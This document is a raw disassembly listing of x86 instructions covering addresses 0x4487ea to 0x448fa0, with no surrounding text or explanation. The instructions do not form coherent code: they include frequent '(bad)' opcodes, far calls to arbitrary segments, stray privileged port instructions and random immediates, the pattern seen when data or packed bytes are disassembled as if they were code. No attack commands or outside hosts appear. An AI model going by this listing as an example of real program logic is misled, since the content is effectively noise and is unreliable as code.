  4487ea:	(bad)  
  4487eb:	test   eax,0xbd97f9a4
  4487f0:	mov    dl,0xae
  4487f2:	xor    BYTE PTR [ebx+0x7b],0xf3
  4487f6:	call   0xea22:0xeaed802f
  4487fd:	cld    
  4487fe:	xchg   DWORD PTR [edi-0x7653f3d2],esp
  448804:	and    eax,0xb255243f
  448809:	jno    0x448867
  44880b:	mov    esp,0xc7000878
  448810:	inc    esi
  448811:	xor    dh,BYTE PTR [ebp-0x57]
  448814:	mov    dl,0xa3
  448816:	inc    esi
  448817:	mov    bh,0x5b
  448819:	or     eax,0x68ad29dd
  44881e:	in     eax,0xcd
  448820:	xor    eax,DWORD PTR [eax-0x7e]
  448823:	sub    dl,BYTE PTR [eax+0x4012628e]
  448829:	or     ebp,DWORD PTR [ebx+0x15feea6e]
  44882f:	pop    esp
  448830:	scas   al,BYTE PTR es:[edi]
  448831:	mov    al,ds:0x7f72649b
  448836:	dec    esi
  448837:	dec    edx
  448838:	(bad)  
  448839:	cmp    eax,0xb3fdd56
  44883e:	repz dec esi
  448840:	int3   
  448841:	fwait
  448842:	pop    edi
  448843:	push   ss
  448844:	out    dx,al
  448845:	scas   eax,DWORD PTR es:[edi]
  448846:	call   0x8c1b:0xea66c911
  44884d:	inc    eax
  44884e:	jns    0x4487f0
  448850:	in     al,0xe1
  448852:	and    ebx,DWORD PTR [ebp-0x62]
  448855:	jp     0x4487fe
  448857:	add    BYTE PTR [ebp-0x5a15585],cl
  44885d:	cs push ecx
  44885f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448860:	repnz xchg ebp,edi
  448863:	or     DWORD PTR [eax-0x6b58366a],ebp
  448869:	sub    ebx,esi
  44886b:	mov    esi,0x5fa6579
  448870:	mov    dl,0xbb
  448872:	int3   
  448873:	jge    0x4488a3
  448875:	push   ss
  448876:	(bad)
  44887a:	popf   
  44887b:	mov    cl,0x99
  44887d:	fnstsw WORD PTR [ebx+0x4f]
  448880:	xor    DWORD PTR [eax-0x66],esi
  448883:	jns    0x448851
  448885:	mov    ebp,0x6f143751
  44888a:	jo     0x448833
  44888c:	xor    ah,BYTE PTR [edx-0x47037560]
  448892:	data16 mov cs,WORD PTR ss:[eax+esi*4]
  448897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448898:	mov    edi,0x6f329fd0
  44889d:	cwde   
  44889e:	jmp    0x83c7:0xe90b0320
  4488a5:	aaa    
  4488a6:	icebp  
  4488a7:	jne    0x448861
  4488a9:	push   0xffffff9a
  4488ab:	mov    al,0xbf
  4488ad:	popa   
  4488ae:	mov    ah,BYTE PTR [ebx+edx*2-0x71]
  4488b2:	imul   esp,DWORD PTR [edi+0x506ce2c9],0x7d
  4488b9:	mov    dh,0x10
  4488bb:	xchg   ebp,eax
  4488bc:	mov    edi,DWORD PTR [edi+0x75]
  4488bf:	and    eax,0xf2b98c51
  4488c4:	cmc    
  4488c5:	dec    ebx
  4488c6:	lds    edi,FWORD PTR [edi-0x6318f425]
  4488cc:	jle    0x4488ef
  4488ce:	or     al,0x55
  4488d0:	rol    BYTE PTR [ebx],cl
  4488d2:	outs   dx,BYTE PTR ds:[esi]
  4488d3:	pop    edi
  4488d4:	inc    edx
  4488d5:	addr16 cdq 
  4488d7:	std    
  4488d8:	je     0x448935
  4488da:	jno    0x448873
  4488dc:	fld    st(3)
  4488de:	xor    al,0x26
  4488e0:	adc    ecx,DWORD PTR [ebx]
  4488e2:	pop    eax
  4488e3:	jge    0x4488da
  4488e5:	push   ebp
  4488e6:	pop    edx
  4488e7:	idiv   BYTE PTR [esi-0x589765b9]
  4488ed:	lods   al,BYTE PTR ds:[esi]
  4488ee:	mov    cl,cl
  4488f0:	(bad)  [edx]
  4488f2:	push   ebx
  4488f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4488f4:	ins    DWORD PTR es:[edi],dx
  4488f5:	int    0xcf
  4488f7:	ins    DWORD PTR es:[edi],dx
  4488f8:	cli    
  4488f9:	xchg   edx,eax
  4488fa:	stc    
  4488fb:	rcl    BYTE PTR [esp+ecx*8-0x7a],0xad
  448900:	cs es pop edx
  448903:	mov    al,0xc7
  448905:	mov    eax,ds:0x9d9aff2
  44890a:	jg     0x448924
  44890c:	cmp    BYTE PTR [eax+0x2c],dh
  44890f:	fptan  
  448911:	sbb    eax,0xdeb267ee
  448916:	stos   BYTE PTR es:[edi],al
  448917:	mov    ah,bl
  448919:	fs mov ebx,ebp
  44891c:	int    0xb
  44891e:	push   ebx
  44891f:	outs   dx,DWORD PTR ds:[esi]
  448920:	test   al,0x36
  448922:	leave  
  448923:	and    dh,BYTE PTR [ecx-0x6bd65bc]
  448929:	loope  0x4488f3
  44892b:	xor    DWORD PTR [edi-0x5cb64aff],esp
  448931:	push   ss
  448932:	sti    
  448933:	ds or  BYTE PTR cs:[esi+0x6d22482d],dh
  44893b:	out    0xb1,eax
  44893d:	iret   
  44893e:	inc    ebx
  44893f:	(bad)  
  448940:	mov    eax,0x727a932c
  448945:	mov    ecx,0x55dff19a
  44894a:	xlat   BYTE PTR ds:[ebx]
  44894b:	sbb    al,dl
  44894d:	or     al,0x28
  44894f:	shl    eax,1
  448951:	inc    edx
  448952:	xor    edi,0x47c9482b
  448958:	mov    dl,0xd6
  44895a:	pop    ebx
  44895b:	push   ecx
  44895c:	out    0xe7,eax
  44895e:	out    dx,al
  44895f:	and    esi,DWORD PTR [eax]
  448961:	sti    
  448962:	adc    eax,0x1cd447a7
  448967:	adc    edi,eax
  448969:	in     eax,dx
  44896a:	int3   
  44896b:	jmp    0x448920
  44896d:	ds hlt 
  44896f:	in     al,0xff
  448971:	fsub   DWORD PTR [esi-0x49fcb5e7]
  448977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448978:	pop    es
  448979:	test   eax,ebp
  44897b:	mov    cl,0xed
  44897d:	outs   dx,BYTE PTR ds:[esi]
  44897e:	pop    edx
  44897f:	push   ds
  448980:	lods   eax,DWORD PTR ds:[esi]
  448981:	sub    bl,al
  448983:	sub    dh,BYTE PTR [edx]
  448985:	call   FWORD PTR [edi+0x7b]
  448988:	xor    ch,al
  44898a:	(bad)  
  44898b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44898c:	adc    eax,0xaaf9fafa
  448991:	retf   0xfbda
  448994:	je     0x4489ee
  448996:	call   0xf5c5:0xacf82608
  44899d:	xlat   BYTE PTR ds:[ebx]
  44899e:	and    al,0xa7
  4489a0:	iret   
  4489a1:	mov    esi,0xc658b190
  4489a6:	ja     0x448a0c
  4489a8:	dec    eax
  4489a9:	stos   BYTE PTR es:[edi],al
  4489aa:	cwde   
  4489ab:	sub    cl,BYTE PTR [esi]
  4489ad:	cmp    bh,BYTE PTR [ebp+edx*4-0x3ea583e9]
  4489b4:	sti    
  4489b5:	pushf  
  4489b6:	mov    dl,0xab
  4489b8:	ret    0x9ac1
  4489bb:	fscale 
  4489bd:	popa   
  4489be:	jge    0x4489d7
  4489c0:	aam    0x33
  4489c2:	sbb    DWORD PTR [ebp-0x1f],0x978d7900
  4489c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4489ca:	sbb    bl,BYTE PTR [ebx-0x1b]
  4489cd:	xchg   DWORD PTR [eax+edi*8+0x54],ebp
  4489d1:	jmp    0x6962285c
  4489d6:	sbb    ch,dl
  4489d8:	cmp    DWORD PTR [esi+0xbb99c9c],0xffffffbe
  4489df:	jl     0x448a60
  4489e1:	push   eax
  4489e2:	adc    al,0xec
  4489e4:	int    0xac
  4489e6:	call   0x84d0:0x3cdee52a
  4489ed:	push   edi
  4489ee:	cmp    DWORD PTR [edi-0x7bc70982],esp
  4489f4:	ds sub eax,0x8db27458
  4489fa:	cmp    DWORD PTR [ebx-0x21],0x5fb5ca3e
  448a01:	or     esp,DWORD PTR [edx-0x68]
  448a04:	push   es
  448a05:	jp     0x448a3c
  448a07:	cmp    edx,DWORD PTR [ebp-0x16]
  448a0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448a0b:	or     ah,0xb
  448a0e:	ss sti 
  448a10:	mov    dh,0xcf
  448a12:	sbb    dl,BYTE PTR [esi-0x36dbcb2f]
  448a18:	push   ds
  448a19:	cmp    edi,DWORD PTR [ecx]
  448a1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448a1c:	(bad)  
  448a1d:	xor    DWORD PTR [eax-0x1],esi
  448a20:	xor    dh,BYTE PTR [esi+eiz*2+0x11]
  448a24:	add    dl,BYTE PTR [edx-0x66]
  448a27:	fistp  QWORD PTR [eax-0xf7ddcef]
  448a2d:	out    dx,eax
  448a2e:	cmp    DWORD PTR [esi-0x6e043de],esp
  448a34:	add    BYTE PTR [edi-0x44],dl
  448a37:	imul   esp,DWORD PTR [ebx],0x5e
  448a3a:	call   0x64fa:0x98e8c560
  448a41:	pop    esp
  448a42:	daa    
  448a43:	aad    0x2e
  448a45:	or     ebx,DWORD PTR ds:0x3a2a984a
  448a4b:	in     eax,dx
  448a4c:	pop    ds
  448a4d:	stos   BYTE PTR es:[edi],al
  448a4e:	call   0x8fc3:0x6e064f1d
  448a55:	popf   
  448a56:	jo     0x4489ff
  448a58:	dec    esi
  448a59:	pop    eax
  448a5a:	xchg   ebx,eax
  448a5b:	lods   al,BYTE PTR ds:[esi]
  448a5c:	(bad)  
  448a5e:	adc    al,0xf1
  448a60:	mov    ch,0xb4
  448a62:	mov    ebp,0x4abafb5e
  448a67:	or     DWORD PTR [edi+0x3],ecx
  448a6a:	xor    esp,DWORD PTR [edi-0x7411b6ee]
  448a70:	jg     0x448a5c
  448a72:	(bad)  [ebp-0x3ae2ab4e]
  448a78:	mov    bl,0xf9
  448a7a:	into   
  448a7b:	dec    ebx
  448a7c:	add    BYTE PTR [ebp+0x2c],bh
  448a7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448a80:	out    dx,eax
  448a81:	dec    esi
  448a82:	cmp    eax,ebx
  448a84:	in     al,0xee
  448a86:	lea    ecx,[edx-0x4e]
  448a89:	mov    BYTE PTR [edx],dl
  448a8b:	aaa    
  448a8c:	fs push edi
  448a8e:	rcr    BYTE PTR [ebx+edx*4],0xb
  448a92:	iret   
  448a93:	lea    esi,[edi+0x29]
  448a96:	ret    0x3fa0
  448a99:	jmp    0x48581d38
  448a9e:	pop    ebx
  448a9f:	jle    0x448a2f
  448aa1:	iret   
  448aa2:	inc    ecx
  448aa3:	fcomip st,st(5)
  448aa5:	or     edx,DWORD PTR [esi]
  448aa7:	add    DWORD PTR [ecx+0x1a410341],esi
  448aad:	mov    DWORD PTR [edx+0x55597c86],ebx
  448ab3:	mov    eax,0x578423d0
  448ab8:	inc    ebx
  448ab9:	or     ebp,DWORD PTR [ecx+0x28729293]
  448abf:	stos   DWORD PTR es:[edi],eax
  448ac0:	pop    ebx
  448ac1:	ret    
  448ac2:	call   0x8c78:0x351f58cd
  448ac9:	repnz stos BYTE PTR es:[edi],al
  448acb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448acc:	jno    0x448a5b
  448ace:	add    BYTE PTR [esi],dl
  448ad0:	xor    edi,eax
  448ad2:	loope  0x448a99
  448ad4:	mov    dl,0x54
  448ad6:	(bad)  
  448ad7:	push   ebx
  448ad8:	and    DWORD PTR [edx+ebp*8-0x5d],esi
  448adc:	sbb    cl,BYTE PTR [eax]
  448ade:	push   ebx
  448adf:	iret   
  448ae0:	popf   
  448ae1:	stos   DWORD PTR es:[edi],eax
  448ae2:	inc    edx
  448ae3:	xchg   ecx,eax
  448ae4:	pop    ss
  448ae5:	mov    ch,0x58
  448ae7:	fcomi  st,st(6)
  448ae9:	jmp    0x448b45
  448aeb:	inc    edx
  448aec:	pop    ebp
  448aed:	or     ebp,DWORD PTR [eax-0x4b]
  448af0:	leave  
  448af1:	test   al,0x85
  448af3:	sub    bl,ah
  448af5:	fstp   DWORD PTR [edx+0x7d2c41b0]
  448afb:	clc    
  448afc:	push   cs
  448afd:	jp     0x448ac8
  448aff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448b00:	gs repnz mov edx,0xe58ad9fd
  448b07:	(bad)
  448b0b:	lds    esi,FWORD PTR [ecx+0x246f48d2]
  448b11:	leave  
  448b12:	adc    al,0x2c
  448b14:	pop    ss
  448b15:	or     esi,ecx
  448b17:	dec    ecx
  448b18:	mov    ds:0xa4c6a46f,al
  448b1d:	(bad)  [ecx]
  448b1f:	mov    al,0xb5
  448b21:	out    0x1d,eax
  448b23:	dec    esi
  448b24:	mov    dl,0x0
  448b26:	in     eax,0x54
  448b28:	mov    ebp,0x67b768ca
  448b2d:	or     dl,BYTE PTR [edi]
  448b2f:	push   es
  448b30:	mov    ebx,0x607fbe57
  448b35:	xlat   BYTE PTR ds:[ebx]
  448b36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448b37:	xchg   ecx,eax
  448b38:	inc    edx
  448b39:	push   ds
  448b3a:	call   0xf679:0x8153d116
  448b41:	sub    DWORD PTR [eax+0x7aef89a],edx
  448b47:	outs   dx,BYTE PTR ds:[esi]
  448b48:	test   ebx,0x2fe7187b
  448b4e:	sub    esi,ebp
  448b50:	mov    dl,0xc
  448b52:	stos   DWORD PTR es:[edi],eax
  448b53:	mov    cl,0x77
  448b55:	jo     0x448b54
  448b57:	lea    ebx,[esi]
  448b59:	pop    ss
  448b5a:	ret    
  448b5b:	mov    al,0xaf
  448b5d:	dec    ebx
  448b5e:	adc    DWORD PTR [edi-0x21],edi
  448b61:	jl     0x448b0b
  448b63:	aaa    
  448b64:	mov    dl,0x55
  448b66:	leave  
  448b67:	test   al,0xc3
  448b69:	cs daa 
  448b6b:	xchg   ebx,eax
  448b6c:	aam    0x8
  448b6e:	pop    edx
  448b6f:	cs dec eax
  448b71:	rcl    BYTE PTR [ebx-0x645285b4],1
  448b77:	mov    WORD PTR [edx+0x63380148],?
  448b7d:	loope  0x448bfc
  448b7f:	jne    0x448b8b
  448b81:	or     edx,DWORD PTR [ebx-0x2a]
  448b84:	sbb    BYTE PTR [edi],cl
  448b86:	retf   0xd308
  448b89:	jno    0x448b1e
  448b8b:	retf   
  448b8c:	idiv   BYTE PTR [edx+eiz*8+0x27]
  448b90:	pop    esi
  448b91:	iret   
  448b92:	add    eax,0x3b0bf70e
  448b97:	rsqrtps xmm2,XMMWORD PTR [esi]
  448b9a:	jne    0x448ba3
  448b9c:	out    0x67,eax
  448b9e:	mov    esp,0x9a260c86
  448ba3:	xchg   edx,eax
  448ba4:	rcr    BYTE PTR [ebx],0xca
  448ba7:	mov    ah,0x8a
  448ba9:	or     ecx,DWORD PTR [edi]
  448bab:	lea    edi,[ecx-0x4fa3cf81]
  448bb1:	xchg   edx,eax
  448bb2:	call   0x6752:0x425c0b1b
  448bb9:	xor    BYTE PTR [edi-0x59],bh
  448bbc:	xchg   esi,eax
  448bbd:	les    edi,FWORD PTR [esi]
  448bbf:	and    al,0xf7
  448bc1:	jnp    0x448bc0
  448bc3:	out    dx,eax
  448bc4:	inc    esp
  448bc5:	ret    0xf19a
  448bc8:	pop    edx
  448bc9:	inc    eax
  448bca:	xchg   esi,eax
  448bcb:	arpl   si,cx
  448bcd:	pusha  
  448bce:	xor    ah,BYTE PTR [edi+ecx*4+0x7c7e801e]
  448bd5:	mov    eax,ds:0x7b245045
  448bda:	mov    WORD PTR [edx-0x161864da],fs
  448be0:	and    eax,0x5fa738fb
  448be5:	imul   edi,DWORD PTR [ebx-0x31442cac],0xffffffcf
  448bec:	mov    al,0x7c
  448bee:	or     BYTE PTR [esi-0x5],cl
  448bf1:	fiadd  WORD PTR [edx+0x46]
  448bf4:	pop    ebx
  448bf5:	and    BYTE PTR [esi],0x35
  448bf8:	das    
  448bf9:	mov    dh,0xb4
  448bfb:	daa    
  448bfc:	stos   DWORD PTR es:[edi],eax
  448bfd:	lds    ebp,FWORD PTR ds:[esi+0x5f9b7339]
  448c04:	sti    
  448c05:	fdivr  QWORD PTR [ebp+0x728dd317]
  448c0b:	shl    BYTE PTR [ebx-0x30252d6d],1
  448c11:	or     esi,ebp
  448c13:	psrad  mm0,QWORD PTR [eax-0x71b943bc]
  448c1a:	call   0xf24c:0x5801a328
  448c21:	out    0xe3,al
  448c23:	popf   
  448c24:	(bad)  [ecx+ebx*1-0x80]
  448c28:	sbb    ah,BYTE PTR [esi]
  448c2a:	mov    dh,BYTE PTR [edx-0x6ed86ede]
  448c30:	mov    dl,0x82
  448c32:	cmc    
  448c33:	push   ecx
  448c34:	aad    0xd9
  448c36:	icebp  
  448c37:	sahf   
  448c38:	jb     0x448c44
  448c3a:	int3   
  448c3b:	mov    ebx,0xc3678b7
  448c40:	push   ebx
  448c41:	xlat   BYTE PTR ds:[ebx]
  448c42:	cmp    eax,0x9adcc530
  448c47:	(bad)  
  448c48:	jmp    0xe168ec85
  448c4d:	or     ah,BYTE PTR es:[edi+0x513caadc]
  448c54:	sub    BYTE PTR [ebx-0x7a],bl
  448c57:	fidiv  DWORD PTR [edx+0x49589544]
  448c5d:	mov    bl,0xcc
  448c5f:	mov    eax,0x1c900b82
  448c64:	pop    eax
  448c65:	inc    eax
  448c66:	and    ah,BYTE PTR fs:[edx+0xa]
  448c6a:	fwait
  448c6b:	out    dx,al
  448c6c:	jae    0x448ca0
  448c6e:	lea    edx,[ebp-0x5fa51feb]
  448c74:	inc    eax
  448c75:	or     ebp,DWORD PTR [ebx]
  448c77:	out    0xac,eax
  448c79:	add    dh,BYTE PTR [edx-0x66ce9f91]
  448c7f:	out    dx,eax
  448c80:	inc    ebx
  448c81:	(bad)  
  448c82:	test   DWORD PTR [edx-0x40183c2f],0x96630bce
  448c8c:	jo     0x448c21
  448c8e:	cmc    
  448c8f:	aam    0xe
  448c91:	mov    edx,0xbea6e49a
  448c96:	jne    0x448c1f
  448c98:	hlt    
  448c99:	sahf   
  448c9a:	imul   esp,DWORD PTR [edi-0x7b12718],0xffffffb6
  448ca1:	aaa    
  448ca2:	push   eax
  448ca3:	aad    0xb2
  448ca5:	mov    edi,ecx
  448ca7:	fmul   QWORD PTR [ebx+0x7e]
  448caa:	aad    0xca
  448cac:	add    cl,BYTE PTR [edx]
  448cae:	jbe    0x448c6b
  448cb0:	loop   0x448c33
  448cb2:	or     DWORD PTR [edx+0x59],ebx
  448cb5:	jecxz  0x448d0f
  448cb7:	mov    cl,0xb2
  448cb9:	xor    esi,DWORD PTR ds:0x18c2d454
  448cbf:	jnp    0x448cd6
  448cc1:	or     edi,DWORD PTR [edi-0x42d2896c]
  448cc7:	sahf   
  448cc8:	mov    bl,0xbd
  448cca:	mov    eax,ds:0xc78ba47c
  448ccf:	jns    0x448d24
  448cd1:	dec    esp
  448cd2:	dec    edx
  448cd3:	cmp    eax,0x91110bee
  448cd8:	xchg   edx,eax
  448cd9:	push   edx
  448cda:	rcr    BYTE PTR [bx+di-0x65d1],cl
  448cdf:	pop    esp
  448ce0:	inc    esp
  448ce1:	loope  0x448d2e
  448ce3:	rcr    BYTE PTR [edx],0x61
  448ce6:	dec    ecx
  448ce7:	test   eax,0xadaf9164
  448cec:	adc    dl,BYTE PTR [ebp+0x37]
  448cef:	adc    ch,BYTE PTR ds:0xb22ee2d2
  448cf5:	adc    eax,0x50667d0d
  448cfa:	(bad)  
  448cfb:	mov    bh,BYTE PTR [eax+0xa]
  448cfe:	ror    DWORD PTR [ebx],1
  448d00:	sub    BYTE PTR [edx-0x1a],dl
  448d03:	and    al,0x71
  448d05:	jecxz  0x448ca9
  448d07:	pushf  
  448d08:	mov    dl,0xa
  448d0a:	inc    esp
  448d0b:	retf   
  448d0c:	dec    ebx
  448d0d:	mov    bh,0x70
  448d0f:	bound  eax,QWORD PTR ds:0x7f84f30b
  448d15:	pushf  
  448d16:	dec    eax
  448d17:	push   edi
  448d18:	xchg   ebx,eax
  448d19:	fstp   QWORD PTR [edx-0x4e615fa4]
  448d1f:	mov    esi,DWORD PTR [ecx-0xa]
  448d22:	dec    edx
  448d23:	mov    al,ds:0xa5e54570
  448d28:	int3   
  448d29:	jmp    0x448d64
  448d2b:	dec    ecx
  448d2c:	add    bl,BYTE PTR es:[edi+0x7930175e]
  448d33:	mov    al,ds:0xd1d885ae
  448d38:	sub    esp,edi
  448d3a:	mov    esp,DWORD PTR [edi+0x1e]
  448d3d:	sub    BYTE PTR [edi+eiz*4-0x54871573],ch
  448d44:	and    BYTE PTR gs:[edx],0x32
  448d48:	sar    BYTE PTR [eax-0x3a],0x63
  448d4c:	xchg   esp,eax
  448d4d:	or     esi,ebp
  448d4f:	lahf   
  448d50:	in     eax,dx
  448d51:	sbb    ebx,ebx
  448d53:	mov    es,WORD PTR [esi]
  448d55:	or     edi,DWORD PTR [edx+ecx*1-0x1b]
  448d59:	mov    edx,0x6b447b4a
  448d5e:	call   0x75b:0xe7c5e148
  448d65:	push   0x4e
  448d67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448d68:	mov    ebx,0x6fcb81d1
  448d6d:	ins    DWORD PTR es:[edi],dx
  448d6e:	ds jns 0x448d23
  448d71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448d72:	xchg   BYTE PTR [edi+ebx*2+0x58],bl
  448d76:	aad    0xeb
  448d78:	mov    esi,0x7eb58204
  448d7d:	inc    eax
  448d7e:	fisub  DWORD PTR [eax+0x23]
  448d81:	popa   
  448d82:	loop   0x448d3e
  448d84:	mov    dl,0xa
  448d86:	cmp    BYTE PTR ds:0x1437e46c,bl
  448d8c:	cmp    ecx,DWORD PTR [ebx]
  448d8e:	xor    BYTE PTR [edi+0x67],0x8d
  448d92:	sbb    esi,edx
  448d94:	dec    eax
  448d95:	jnp    0x448d31
  448d97:	popa   
  448d98:	push   ds
  448d99:	jg     0x448d44
  448d9b:	add    eax,0xa78d0c1d
  448da0:	jbe    0x448d4d
  448da2:	adc    bh,BYTE PTR [edx+0x41]
  448da5:	xchg   DWORD PTR [esi+esi*8-0x74],edi
  448da9:	xchg   BYTE PTR [ebx+0x7e1500a7],bh
  448daf:	lahf   
  448db0:	xchg   edx,eax
  448db1:	jp     0x448e20
  448db3:	sar    DWORD PTR [ebp-0x226a07f6],cl
  448db9:	imul   eax,edi,0x7b
  448dbc:	ret    0xc1f7
  448dbf:	aaa    
  448dc0:	mov    ebp,0x5d143811
  448dc5:	sub    ebx,esi
  448dc7:	dec    ebx
  448dc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448dc9:	inc    edi
  448dca:	loop   0x448d73
  448dcc:	or     BYTE PTR [ebx-0x22320098],dl
  448dd2:	dec    ebx
  448dd3:	sti    
  448dd4:	mov    dl,0xc
  448dd6:	int3   
  448dd7:	call   0xc0e8a7a7
  448ddc:	pop    ebp
  448ddd:	or     esp,DWORD PTR [eax-0x257dbbbf]
  448de3:	(bad)  
  448de6:	call   0xb6a:0xc9474236
  448ded:	(bad)  
  448dee:	adc    DWORD PTR [edi+0x5639f861],esp
  448df4:	stc    
  448df5:	sub    ebx,edi
  448df7:	mov    eax,0x7bcee0b2
  448dfc:	dec    esi
  448dfd:	ret    0x4f32
  448e00:	call   0x8ca68a1a
  448e05:	or     edx,DWORD PTR [edi+0x4aa8e728]
  448e0b:	push   eax
  448e0c:	mov    dl,0x28
  448e0e:	and    al,BYTE PTR [ebx+0x1b]
  448e11:	sbb    al,0xf2
  448e13:	inc    edx
  448e14:	mov    ah,0xb
  448e16:	push   cs
  448e17:	push   ebx
  448e18:	xchg   BYTE PTR [ebx+0x1adccd9d],ch
  448e1e:	call   0x60e9:0x18c9bc52
  448e25:	sub    al,al
  448e27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448e28:	jl     0x448e65
  448e2a:	fnstcw WORD PTR ds:0xc8cce609
  448e30:	mov    dl,0x3a
  448e32:	loop   0x448dfe
  448e34:	shl    ebx,0xba
  448e37:	aas    
  448e38:	pop    edx
  448e39:	or     dh,BYTE PTR [ebx+0x6f5c4ccb]
  448e3f:	sbb    edx,edx
  448e41:	xlat   BYTE PTR ds:[ebx]
  448e42:	out    0xb1,al
  448e44:	mov    dl,0x4a
  448e46:	inc    edi
  448e47:	call   0x99ce8ab
  448e4c:	cmp    edi,esi
  448e4e:	pop    ss
  448e4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448e50:	sar    BYTE PTR [ebx+0x24],1
  448e53:	push   es
  448e54:	add    ebx,DWORD PTR [edi+0x2db59dfe]
  448e5a:	fdivrp st(3),st
  448e5c:	and    BYTE PTR [ebp-0x5f4d47c3],ah
  448e62:	cmp    dl,cl
  448e64:	and    DWORD PTR [ebx],ecx
  448e66:	jmp    0xbfd3:0x9c641a5d
  448e6d:	call   0x71c4520c
  448e72:	mov    bh,0xe6
  448e74:	data16 sbb dl,BYTE PTR [ecx]
  448e77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448e78:	addr16 ret 
  448e7a:	add    al,BYTE PTR [ebx]
  448e7c:	cmp    al,dh
  448e7e:	test   BYTE PTR [edi],bl
  448e80:	mov    dl,0xc4
  448e82:	xor    edi,DWORD PTR [ebx]
  448e84:	(bad)
  448e87:	cdq    
  448e88:	(bad)  
  448e89:	or     ebp,DWORD PTR [ecx]
  448e8b:	out    dx,al
  448e8c:	in     al,0xf8
  448e8e:	push   ds
  448e8f:	xchg   ebx,eax
  448e90:	scas   al,BYTE PTR es:[edi]
  448e91:	cld    
  448e92:	call   0x67ce:0x84f7830b
  448e99:	push   ecx
  448e9a:	cdq    
  448e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448e9c:	cs or  eax,0x996944c4
  448ea2:	mov    esp,0xb1dd8f49
  448ea7:	mov    ds:0xcd9e1b42,eax
  448eac:	sbb    BYTE PTR [ebx],cl
  448eae:	cmp    DWORD PTR [ebp-0x7ebd0b3a],eax
  448eb4:	mov    bl,0x3e
  448eb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448eb7:	pop    ebx
  448eb8:	jb     0x448f14
  448eba:	clc    
  448ebb:	(bad)  
  448ebc:	jbe    0x448e7a
  448ebe:	sbb    esi,DWORD PTR [edi]
  448ec0:	clc    
  448ec1:	or     al,0x6d
  448ec3:	pop    edi
  448ec4:	push   cs
  448ec5:	pop    ds
  448ec6:	sub    dh,BYTE PTR [edi-0x7b]
  448ec9:	push   eax
  448eca:	dec    edx
  448ecb:	cmp    DWORD PTR [edx+0x19214c14],esi
  448ed1:	sub    ebp,DWORD PTR [esi-0x12]
  448ed4:	fidivr WORD PTR [ebp-0x7a]
  448ed7:	mov    edx,0xe33234f6
  448edc:	add    DWORD PTR [eax-0x6c2a9832],ecx
  448ee2:	in     al,dx
  448ee3:	push   cs
  448ee4:	mov    dl,0x27
  448ee6:	fstp   st(2)
  448ee8:	pushf  
  448ee9:	lods   eax,DWORD PTR ds:[esi]
  448eea:	or     bh,BYTE PTR [edi+0x21]
  448eed:	or     ebx,DWORD PTR [ecx+0x6b]
  448ef0:	jb     0x448f6b
  448ef2:	stc    
  448ef3:	xchg   DWORD PTR [ecx],edi
  448ef5:	fcomp  QWORD PTR [ebx+0x6bdf17e4]
  448efb:	mov    ds:0xed623142,al
  448f00:	cmp    BYTE PTR [ebx],cl
  448f02:	iret   
  448f03:	mov    es,WORD PTR [ebp+0x1dd2f477]
  448f09:	rcr    BYTE PTR [edx+0x6de0e300],cl
  448f0f:	xor    ch,0x19
  448f12:	add    al,0xa4
  448f14:	add    esp,DWORD PTR [edi]
  448f16:	jb     0x448f5a
  448f18:	xchg   ebx,eax
  448f19:	sub    eax,0x2f37b30a
  448f1e:	in     al,dx
  448f1f:	pop    esi
  448f20:	mov    bl,0x5d
  448f22:	mov    bl,0x8f
  448f24:	jns    0x448f25
  448f26:	jmp    DWORD PTR [ebx+0x7e]
  448f29:	dec    edx
  448f2a:	pop    ebp
  448f2b:	cwde   
  448f2c:	pop    ecx
  448f2d:	or     DWORD PTR [ecx+0x70658f66],ebx
  448f33:	cmp    eax,0x83ea890a
  448f38:	mov    dl,0xb1
  448f3a:	outs   dx,BYTE PTR ds:[esi]
  448f3b:	push   es
  448f3c:	out    0x47,al
  448f3e:	pop    edx
  448f3f:	test   BYTE PTR [esi+0xb],bh
  448f42:	fwait
  448f43:	sub    BYTE PTR [edi+0x793091a],bl
  448f49:	xchg   edx,eax
  448f4a:	mov    dh,0x52
  448f4c:	cs repnz call 0xfc8d:0x36b9ad57
  448f55:	or     ecx,DWORD PTR ds:0x89b223d6
  448f5b:	sbb    ebx,DWORD PTR fs:[edi-0x14]
  448f5f:	jb     0x448f13
  448f61:	or     DWORD PTR [ecx-0x5d],edx
  448f64:	in     eax,dx
  448f65:	xchg   esi,eax
  448f66:	dec    edx
  448f67:	xor    BYTE PTR es:[ebx],cl
  448f6a:	sbb    ebx,eax
  448f6c:	push   edi
  448f6d:	std    
  448f6e:	mov    ds:0x7ad388d3,al
  448f73:	into   
  448f74:	mov    dl,0x85
  448f76:	out    0x46,al
  448f78:	test   BYTE PTR [eax],bl
  448f7a:	dec    ebx
  448f7b:	or     DWORD PTR [eax-0x5d58de11],eax
  448f81:	hlt    
  448f82:	jae    0x448fdb
  448f84:	imul   edi,esp,0x38b24a79
  448f8a:	inc    ebp
  448f8b:	rol    BYTE PTR [ebx+0x52],cl
  448f8e:	std    
  448f8f:	in     al,0xed
  448f91:	xor    bh,al
  448f93:	push   0xdb194bb2
  448f98:	cli    
  448f99:	and    DWORD PTR [ecx-0x5c2d4d84],ecx
  448f9f:	outs   dx,DWORD PTR ds:[esi]
  448fa0:	mov    DWORD PTR [edi+0xb2fe646],ebx
